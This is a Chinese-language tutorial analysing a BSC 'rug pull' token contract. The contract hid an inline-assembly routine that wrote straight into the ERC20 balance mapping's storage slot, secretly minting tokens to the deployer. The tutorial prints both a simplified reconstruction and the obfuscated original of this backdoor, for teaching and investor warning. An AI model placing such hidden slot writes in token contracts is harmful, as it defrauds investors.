# 土狗合约:&nbsp;&nbsp;&nbsp;&nbsp;03.修改插槽欺诈

本视频讲解刚刚发生的一起土狗合约利用数据插槽 rug事件。您可以学到智能合约中状态数据使用插槽存储的相关知识，以及 Solidity 中如何使用内联汇编。

**视频**：[Bilibili](https://www.bilibili.com/video/BV1GM4y1W7pq)  |  [Youtube](https://youtu.be/RIkP7PoH-7o)
<p align="center"><img src="./img/security-rugpull-v2.png" align="middle" /></p>

**官网**：[BinSchoolApp](https://binschool.app)

**代码**：[github.com/binschoolapp/rug-pull-contract](https://github.com/binschoolapp/rug-pull-contract)

**推特**：[@BinSchoolApp](https://twitter.com/BinSchoolApp)    **Discord**：[BinSchoolApp](https://discord.gg/PB2YEvggWq)   **微信**：bkra50 

-----
昨天中午，也就是7月26日12点43分，在币安智能链BSC上，有一个土狗合约通过修改数据插槽 slot 的方式，增发了天量代币，将池子中的资金全部卷走，共获利 114万 USDT，合人民币820万。

交易的哈希： 0x8d07f605926837ea0f9e1e24dba0fb348cb3e97d，您可以到 BSC 区块浏览器详细查看。

从区块浏览器的数据来看，这个合约的表现非常诡异。在项目代币没有增发记录的情况下，合约部署者大量增发了代币，卷走了池子里面的资金。

我们通过区块浏览器观察 Holders，这个合约发行的代币，符号为 IEGT，合约记录的发行总量为 totalSupply 为500万。但是，在 dead 和 pair地址中的代币总量，却远远不止 500万。

那么凭空多出来的代币从何而来呢，为什么没有被区块浏览器统计呢。进一步追查这些代币的来源时可以发现，有一个地址的交易非常蹊跷，它只有转出记录而没有转入记录。

众所周知，ERC20合约标准规定了代币铸造和转移时，必须实现 Transfer 事件。区块浏览器需要依赖这些事件记录进行数据统计。所以，当在区块浏览器中发现代币总额与实际数量不符合时，就说明代币在进行增发时没有记录事件。

这个欺诈合约的代码是开源的，我又查看了这个合约 Transfer函数，发现它的这段函数代码并没有问题，确实记录了Transfer事件。这说明，它没有按照正规流程增发代币，而是绕过 mint 函数，直接修改了特定地址的代币余额。

再次查看这个合约的源码，终于发现了恶意代码的位置和欺诈的手法。就是这段代码偷偷修改了特定地址的余额，凭空给这个特定地址产生了巨量代币。

我简化了这个合约，并依据它的欺诈方法，复原了这个欺诈过程。简化合约的核心代码为：

```solidity
contract TokenIEGT is ERC20 {
    // 构造函数
    constructor() ERC20("IEGT","IEGT") {
        _pathSet(); // 调用恶意代码
    }

    // 恶意代码
    function _pathSet() private {
        assembly {
            let y := 0x17F6AD8Ef982297579C203069C1DbfFE4348c372

            mstore(0, y)
            mstore(32, 0)
            
            sstore(keccak256(0, 64), 666) 
        }      
     }
}
```

完整的合约代码链接 [TokenIEGT](https://github.com/binschoolapp/rug-pull-contract/blob/main/03-Slot/TokenIEGT.sol)。

我们来分析一下这个合约。这个合约继承了标准的 ERC20 合约。构造函数中发布的代币的名称和符号都是 IEGT。

然后在构造函数中调用了一个私有函数 _pathSet，这个函数 _pathSet 内部是一段内联汇编代码。这段汇编代码就4句，比较简单，稍后详细解释。其中红线圈出来第一个位置，是一个账户地址。

我们可以把完整代码复制到 Remix 里，查看效果。

查看它的发行总量，点击 totalSupply，结果是 0。这是因为我们并没有在代码中铸造，也就是没有调用 mint 函数。

我们再看看代码中的这个地址：0x17F6AD8Ef982297579C203069C1DbfFE4348c372，调用 balanceOf 函数，它的余额竟然有 666wei。

这些代币从哪里来的呢？其实就是合约中的函数 _pathSet  偷偷发行的。它给这个地址发行了 666wei 代币。

## 状态变量的存储

要看懂这段代码，我们就先要学习一下合约变量的存储知识。首先说一下状态变量的存储。

状态变量是合约中声明的永久存储的数据，而存储插槽是用于存储这些状态变量的物理位置，存储插槽的英文名称为 slot。每个状态变量都会被映射到一个存储插槽上，而存储插槽的大小为 32个字节，这是EVM中定义的插槽标准大小。

当我们在 Solidity 中声明一个状态变量时，例如 uint256 a，这个变量 a 会被存储在一个存储插槽上。Solidity 编译器会根据变量的类型和声明顺序，决定将状态变量存储在哪个插槽上，以及如何访问这些数据。

插槽编号是从 0开始的，按照状态变量的声明顺序依次分配。例如，第一个状态变量将存储在插槽0上，第二个状态变量将存储在插槽 1上，以此类推。实际上，插槽的使用规则更复杂一点，长度小于32个字节的多个状态变量，可能会合并到一个插槽中。如果状态变量是复合类型，则它们可能会占用多个插槽。

我们可以使用内联汇编的 sload 和 sstore指令来读取和写入存储插槽的数据。

## 内存变量的存储

内存变量，顾名思义，它的数据是存放在内存中。EVM执行一个合约时，都会为它专门分配一块内存，内存变量的内容就存放在这块内存中。一旦调用合约的函数执行结束，这块分配的内存就会释放。所以，内存变量也就随之消失了。

在 Solidity 的内联汇编语言中，mload 和 mstore是用于读取和写入内存变量的指令。这两条指令操作的内存大小也都是固定的32个字节。

## 简化代码分析

有了上面的知识，我们来分析一下这段代码：

```solidity
contract TokenIEGT is ERC20 {
    // 构造函数
    constructor() ERC20("IEGT","IEGT") {
        _pathSet(); // 调用恶意代码
    }

    // 恶意代码
    function _pathSet() private {
        assembly {
            let y := 0x17F6AD8Ef982297579C203069C1DbfFE4348c372

            mstore(0, y)
            mstore(32, 0)
            
            sstore(keccak256(0, 64), 666) 
        }      
     }
}
```

第一句：给变量 y，赋值了一个地址。

第二句：mstore(0,y) 的意思是将数值 y 存储到内存位置为 0 的地方，占据 32 个字节。其实就是把地址 0x17F6AD8Ef982297579C203069C1DbfFE4348c372 写进去，不足的位置都补 0。

第三句：mstore(32, 0) 的意思是将数值 0 存储到内存位置为 32 个字节的地方，占据 32 个字节。也就是内存中从 32 字节开始，写入 32 个字节的0。

第四句：sstore 这句代码的意思是将数值 666 写到一个特定位置的插槽中。这个特定位置是通过 keccak256(0, 64) 计算得到的。keccak256(0, 64) 是计算了内存中从 0 到 64 字节的数据的哈希值。内存中从 0 到 64 字节的数据，其实就是第二句和第三句写入内存的数据合并在一起。它的内容是：

```solidity
00000000000000000000000017F6AD8Ef982297579C203069C1DbfFE4348c372
0000000000000000000000000000000000000000000000000000000000000000
```

它的长度是64个字节。也就是对这个 64 字节数据进行哈希，得到的结果值作为存储位置，将 666 存进去。

问题其实就出在这个语句上。keccak256 语句计算出来的插槽位置，其实就是合约中状态变量 _balances 里的一个数据存储位置。

_balances 是在它的 父合约 中定义的变量，是一个 mapping 类型的数据。因为继承关系，当前合约也拥有了这个变量  _balances。

_balances 就是 ERC20 代币合约中存放所有地址余额的变量。你只要修改了这里面的数据，那么对应的地址里代币的余额就修改了。

_balances 是一个状态变量，也就是说，它的数据存储在插槽里。由于它在合约里定义的位置在最前面，所以它被存储在第一个插槽 slot 0。

mapping 里存储的键值对是动态的，它可以有任意多个。它们并不跟 mapping 存放在一起，而是要通过 keccak256 计算，来决定到底该存放到哪一个位置。

计算公式就是 keccak256(address . slot)，其中 address . slot，是指把address和槽位拼接在一起。

比如 _balances 槽位 slot 等于 0，address 是 0x17F6AD8Ef982297579C203069C1DbfFE4348c372。那么，keccak256(address . slot)，实际上就是 _balances[0x17F6AD8Ef982297579C203069C1DbfFE4348c372] 的数据存储位置。

如果我们向这个位置写入 666，那么就意味着 0x17F6AD8Ef982297579C203069C1DbfFE4348c372 这个地址拥有了 666 Wei个代币。

我们再看看内联汇编中的第4条语句。keccak256(0, 64) 实际上就是 keccak256(address . slot)，就等价于 _balances[0x17F6AD8Ef982297579C203069C1DbfFE4348c372] 的存储位置。

所以，整个的内联汇编语句，其实就是一句 Solitity 语句:

```solidity
_balances[0x17F6AD8Ef982297579C203069C1DbfFE4348c372]  =  666。
```

也就是说，在部署合约的时候，就给 0x17F6AD8Ef982297579C203069C1DbfFE4348c372 凭空创造了 666 Wei 个代币。

## 原始代码分析
明白了这些，就很容易理解欺诈合约的手段了。它的恶意代码就是在这个 _pathSet 函数中。它故意没对代码进行格式化处理，看起来比较乱，就是为了迷惑投资者。

其实，其它代码都是保护这段内容设置的。我们把它美化一下：

```solidity
 //......
        assembly {
            let y := add(add(mul(379858174470926,exp(10,28)),mul(61835533555714,exp(10,14))),74433453022038) 

            mstore(0, y) 
            mstore(32, 0x0) 

            sstore(keccak256(0, 64), exp(timestamp(), 6))
             
            //...... 
        }
  //......
```

这是不是跟我的代码结构是一模一样。它的变量 y，为了不让人发现是个地址，故意拆解成多个数相加，其实加在一起，就是合约创建者自己控制的一个地址，也就是用来掏空池子的地址。合约在部署的时候，凭空为它铸造了巨量代币。

sstore 函数中，这个数量是用当前区块的时间戳，进行了 s6 次方运算，这就是那个巨大的代币数量。

这个土狗合约就是利用了修改插槽数据的方式进行欺诈，投资者损失了接近上千万元。当然，这个合约的编写者应该是一个 Solidity 高手，对合约的内存操作研究得非常深入，这也是他得手的主要原因。所以，对于土狗合约中，出现了内联汇编语句的话，我们千万不要贸然投资。

其实，大多数合约根本用不到内联汇编，事出反常必有妖。除非在有些特殊场景下，出于节省 gas 费的目的，才会使用内联汇编。